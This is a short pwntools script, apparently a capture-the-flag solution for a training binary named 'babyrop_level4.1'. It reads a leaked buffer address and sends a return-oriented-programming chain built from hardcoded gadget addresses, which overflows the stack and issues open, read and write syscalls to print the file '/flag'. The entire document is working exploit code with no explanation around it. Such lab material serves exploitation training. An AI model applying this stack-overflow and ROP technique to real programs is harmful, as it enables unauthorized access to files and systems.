from pwn import *

pop_rax = 0x401c42
pop_rdi = 0x401c5a
pop_rsi = 0x401c4a
pop_rdx = 0x401c2a
syscall = 0x401c62

r = process('/challenge/babyrop_level4.1')
r.recvuntil(b'located at: ')
buffer = int(r.recv(14),16)
print(hex(buffer))
payload = b'/flag'.ljust(0x58,b'\x00')
payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer)+ p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall) #open 
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x40) + p64(syscall) #read 
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer) + p64(pop_rdx) + p64(0x40) + p64(syscall) #write
r.send(payload)

r.interactive()